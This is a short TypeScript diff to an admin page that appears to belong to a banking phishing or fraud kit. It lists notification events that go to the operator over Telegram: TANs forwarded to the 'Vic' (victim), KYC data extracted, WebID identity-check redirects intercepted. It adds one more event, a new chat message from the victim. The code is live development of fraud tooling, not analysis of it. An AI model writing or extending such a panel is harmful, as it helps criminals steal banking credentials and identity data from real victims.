@@ -49,6 +49,7 @@ const EVENTS: { key: TelegramDbEvent; label: string }[] = [
   { key: "tan_forwarded_to_vic", label: "TAN weitergeleitet" },
   { key: "kyc_data_extracted", label: "KYC-Daten verfügbar" },
   { key: "webid_redirect_intercepted", label: "WebID Redirect abgefangen" },
+  { key: "chat_message_received", label: "Neue Chat-Nachricht vom Vic" },
 ];
 
 export default function AdminTelegram() {
